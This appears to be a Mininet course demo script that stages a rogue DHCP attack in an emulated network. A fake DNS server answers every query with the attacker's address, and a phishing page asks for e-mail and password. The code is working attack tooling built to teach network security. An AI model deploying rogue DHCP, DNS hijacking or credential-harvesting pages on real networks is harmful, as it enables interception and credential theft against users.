#!/usr/bin/python

"""
Rogue DHCP server demo for Stanford CS144.

We set up a network where the DHCP server is on a slow
link. Then we start up a rogue DHCP server on a fast
link which should beat it out (although we should look
at wireshark for the details.) This rogue DHCP server
redirects DNS to a rogue DNS server, which redirects
all DNS queries to the attacker. Hilarity ensues.

The demo supports two modes: the default interactive
mode (X11/firefox) or a non-interactive "text" mode
(text/curl).

We could also do the whole thing without any custom
code at all, simply by using ettercap.

Note you may want to arrange your windows so that
you can see everything well.
"""

from mininet.net import Mininet
from mininet.topo import Topo
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.util import quietRun
from mininet.log import setLogLevel, info
from mininet.term import makeTerms
#from mininet.examples.nat import connectToInternet, stopNAT
from mininet.node import Node

from sys import exit, stdin, argv
from re import findall
from time import sleep
import os

def checkRequired():
    "Check for required executables"
    required = [ 'udhcpd', 'udhcpc', 'dnsmasq', 'curl', 'firefox' ]
    for r in required:
        if not quietRun( 'which ' + r ):
            print ('* Installing', r)
            print (quietRun( 'apt-get install -y ' + r ))
            if r == 'dnsmasq':
                # Don't run dnsmasq by default!
                print (quietRun( 'update-rc.d dnsmasq disable' ))

class DHCPTopo( Topo ):
    """Topology for DHCP Demo:
       client - switch - slow link - DHCP server
                  |
                attacker"""
    def __init__( self, *args, **kwargs ):
        Topo.__init__( self, *args, **kwargs )
        client = self.addHost( 'h1', ip='10.0.0.10/24' )
        switch = self.addSwitch( 's1' )
        dhcp = self.addHost( 'dhcp', ip='10.0.0.50/24' )
        evil = self.addHost( 'evil', ip='10.0.0.66/24'  )
        self.addLink( client, switch )
        self.addLink( evil, switch )
        self.addLink( dhcp, switch, bw=10, delay='500ms' )


# DHCP server functions and data

DNSTemplate = """
start		10.0.0.10
end		10.0.0.90
option	subnet	255.255.255.0
option	domain	local
option	lease	7  # seconds
"""
# option dns 8.8.8.8
# interface h1-eth0

def makeDHCPconfig( filename, intf, gw, dns ):
    "Create a DHCP configuration file"
    config = (
        'interface %s' % intf,
        DNSTemplate,
        'option router %s' % gw,
        'option dns %s' % dns,
        '' )
    with open( filename, 'w' ) as f:
        f.write( '\n'.join( config ) )

def startDHCPserver( host, gw, dns ):
    "Start DHCP server on host with specified DNS server"
    info( '* Starting DHCP server on', host, 'at', host.IP(), '\n' )
    dhcpConfig = '/tmp/%s-udhcpd.conf' % host
    makeDHCPconfig( dhcpConfig, host.defaultIntf(), gw, dns )
    host.cmd( 'udhcpd -f', dhcpConfig,
              '1>/tmp/%s-dhcp.log 2>&1  &' % host )

def stopDHCPserver( host ):
    "Stop DHCP server on host"
    info( '* Stopping DHCP server on', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %udhcpd' )


# DHCP client functions

def startDHCPclient( host ):
    "Start DHCP client on host"
    intf = host.defaultIntf()
    host.cmd( 'dhclient -v -d -r', intf )
    host.cmd( 'dhclient -v -d 1> /tmp/dhclient.log 2>&1', intf, '&' )

def stopDHCPclient( host ):
    host.cmd( 'kill %dhclient' )

def waitForIP( host ):
    "Wait for an IP address"
    info( '*', host, 'waiting for IP address' )
    while True:
        host.defaultIntf().updateIP()
        if host.IP():
            break
        info( '.' )
        sleep( 1 )
    info( '\n' )
    info( '*', host, 'is now using',
          host.cmd( 'grep nameserver /etc/resolv.conf' ) )

# Fake DNS server

def startFakeDNS( host ):
    "Start Fake DNS server"
    info( '* Starting fake DNS server', host, 'at', host.IP(), '\n' )
    host.cmd( 'dnsmasq -k -A /#/%s 1>/tmp/dns.log 2>&1 &' %  host.IP() )

def stopFakeDNS( host ):
    "Stop Fake DNS server"
    info( '* Stopping fake DNS server', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %dnsmasq' )

# Evil web server

def startEvilWebServer( host ):
    "Start evil web server"
    info( '* Starting web server', host, 'at', host.IP(), '\n' )
    webdir = '/tmp/evilwebserver'
    host.cmd( 'rm -rf', webdir )
    host.cmd( 'mkdir -p', webdir )
    with open( webdir + '/index.html', 'w' ) as f:
        # If we wanted to be truly evil, we could add this
        # to make it hard to retype URLs in firefox
        # f.write( '<meta http-equiv="refresh" content="1"> \n' )
        f.write( '<html><p>You have been pwned! Please sign in.<p>\n'
                 '<body><form action="">\n'
                 'e-mail: <input type="text" name="firstname"><br>\n'
                 'password: <input type="text" name="firstname"><br>\n'
                 '</form></body></html>' )
    host.cmd( 'cd', webdir )
    host.cmd( 'python -m SimpleHTTPServer 80 >& /tmp/http.log &' )

def stopEvilWebServer( host ):
    "Stop evil web server"
    info( '* Stopping web server', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %python' )


# Some other potentially useful code if we want to
# make this an interactive demo.

def readline():
    "Read a line from stdin"
    return stdin.readline()


def prompt( s=None ):
    "Print a prompt and read a line from stdin"
    if s is None:
        s = "Press return to continue: "
    print (s)
    return readline()

def mountPrivateResolvconf( host ):
    "Create/mount private /etc/resolv.conf for host"
    etc = '/tmp/etc-%s' % host
    host.cmd( 'mkdir -p', etc )
    host.cmd( 'mount --bind /etc', etc )
    host.cmd( 'mount -n -t tmpfs tmpfs /etc' )
    host.cmd( 'ln -s %s/* /etc/' % etc )
    host.cmd( 'rm /etc/resolv.conf' )
    host.cmd( 'cp %s/resolv.conf /etc/' % etc )

def unmountPrivateResolvconf( host ):
    "Unmount private /etc dir for host"
    etc = '/tmp/etc-%s' % host
    host.cmd( 'umount /etc' )
    host.cmd( 'umount', etc )
    host.cmd( 'rmdir', etc )

def dhcpdemo( firefox=True ):
    "Rogue DHCP server demonstration"
    checkRequired()
    topo = DHCPTopo()
    net = Mininet( topo=topo, link=TCLink )
    h1, dhcp, evil = net.get( 'h1', 'dhcp', 'evil' )
    # connectToInternet calls net.start() for us!
    rootnode = connectToInternet( net, 's1' )
    mountPrivateResolvconf( h1 )
    # Set up a good but slow DHCP server
    startDHCPserver( dhcp, gw=rootnode.IP(), dns='8.8.8.8')
    startDHCPclient( h1 )
    waitForIP( h1 )
    # Make sure we can fetch the good google.com
    info( '* Fetching google.com:\n' )
    print (h1.cmd( 'curl google.com' ))
    # For firefox, start it up and tell user what to do
    if firefox:
        net.terms += makeTerms( [ h1 ], 'h1' )
        h1.cmd( 'firefox www.stanford.edu -geometry 400x400-50+50 &' )
        print ('*** You may want to do some DNS lookups using dig')
        print ('*** Please go to amazon.com in Firefox')
        print ('*** You may also wish to start up wireshark and look at bootp and/or dns')
        prompt( "*** Press return to start up evil DHCP server: " )
    # Now start up an evil but fast DHCP server
    startDHCPserver( evil, gw=rootnode.IP(), dns=evil.IP() )
    # And an evil fake DNS server
    startFakeDNS( evil )
    # And an evil web server
    startEvilWebServer( evil )
    h1.cmd( 'ifconfig', h1.defaultIntf(), '0' )
    waitForIP( h1 )
    info( '* New DNS result:\n' )
    info( h1.cmd( 'host google.com' ) )
    # Test http request
    if firefox:
        print ("*** You may wish to look at DHCP and DNS results in wireshark")
        print ("*** You may also wish to do some DNS lookups using dig")
        print ("*** Please go to google.com in Firefox")
        print ("*** You may also want to try going back to amazon.com and hitting shift-refresh")
    else:
        info( '* Fetching google.com:\n' )
        print (h1.cmd( 'curl google.com' ))
    if firefox:
        prompt( "*** Press return to shut down evil DHCP/DNS/Web servers: " )
    # Clean up everything
    stopFakeDNS( evil )
    stopEvilWebServer( evil )
    stopDHCPserver( evil )
    if firefox:
        print ("*** Try going to some other web sites if you like")
        prompt( "*** Press return to exit: " )
    stopDHCPserver( dhcp )
    stopDHCPclient( h1 )
    stopNAT( rootnode )
    unmountPrivateResolvconf( h1 )
    net.stop()

def usage():
    "Print usage message"
    print ("%s [ -h | -text ]")
    print ("-h: print this message")
    print ("-t: run in text/batch vs. firefox/x11 mode")

def stopNAT( root ):
    """Stop NAT/forwarding between Mininet and external network"""
    # Flush any currently active rules
    root.cmd( 'iptables -F' )
    root.cmd( 'iptables -t nat -F' )

    # Instruct the kernel to stop forwarding
    root.cmd( 'sysctl net.ipv4.ip_forward=0' )	
	
def connectToInternet( network, switch='s1', rootip='10.254', subnet='10.0/8'):
    """Connect the network to the internet
       switch: switch to connect to root namespace
       rootip: address for interface in root namespace
       subnet: Mininet subnet"""
    switch = network.get( switch )
    prefixLen = subnet.split( '/' )[ 1 ]
    routes = [ subnet ]  # host networks to route to

    # Create a node in root namespace
    root = Node( 'root', inNamespace=False )

    # Prevent network-manager from interfering with our interface
    fixNetworkManager( root, 'root-eth0' )

    # Create link between root NS and switch
    link = network.addLink( root, switch )
    link.intf1.setIP( rootip, prefixLen )

    # Start network that now includes link to root namespace
    network.start()

    # Start NAT and establish forwarding
    startNAT( root )

    # Establish routes from end hosts
    for host in network.hosts:
        host.cmd( 'ip route flush root 0/0' )
        host.cmd( 'route add -net', subnet, 'dev', host.defaultIntf() )
        host.cmd( 'route add default gw', rootip )

def fixNetworkManager( root, intf ):
    """Prevent network-manager from messing with our interface,
       by specifying manual configuration in /etc/network/interfaces
       root: a node in the root namespace (for running commands)
       intf: interface name"""
    cfile = '/etc/network/interfaces'
    line = '\niface %s inet manual\n' % intf
    config = open( cfile ).read()
    if ( line ) not in config:
        print '*** Adding', line.strip(), 'to', cfile
        with open( cfile, 'a' ) as f:
            f.write( line )
    # Probably need to restart network-manager to be safe -
    # hopefully this won't disconnect you
    root.cmd( 'service network-manager restart' )

def startNAT( root, inetIntf='eth0', subnet='10.0/8' ):
    """Start NAT/forwarding between Mininet and external network
    root: node to access iptables from
    inetIntf: interface for internet access
    subnet: Mininet subnet (default 10.0/8)="""

    # Identify the interface connecting to the mininet network
    localIntf =  root.defaultIntf()

    # Flush any currently active rules
    root.cmd( 'iptables -F' )
    root.cmd( 'iptables -t nat -F' )

    # Create default entries for unmatched traffic
    root.cmd( 'iptables -P INPUT ACCEPT' )
    root.cmd( 'iptables -P OUTPUT ACCEPT' )
    root.cmd( 'iptables -P FORWARD DROP' )

    # Configure NAT
    root.cmd( 'iptables -I FORWARD -i', localIntf, '-d', subnet, '-j DROP' )
    root.cmd( 'iptables -A FORWARD -i', localIntf, '-s', subnet, '-j ACCEPT' )
    root.cmd( 'iptables -A FORWARD -i', inetIntf, '-d', subnet, '-j ACCEPT' )
    root.cmd( 'iptables -t nat -A POSTROUTING -o ', inetIntf, '-j MASQUERADE' )

    # Instruct the kernel to perform forwarding
    root.cmd( 'sysctl net.ipv4.ip_forward=1' )
	
if __name__ == '__main__':
    setLogLevel( 'info' )
    if '-h' in argv:
        usage()
        exit( 1 )
    firefox = '-t' not in argv
    dhcpdemo( firefox=firefox)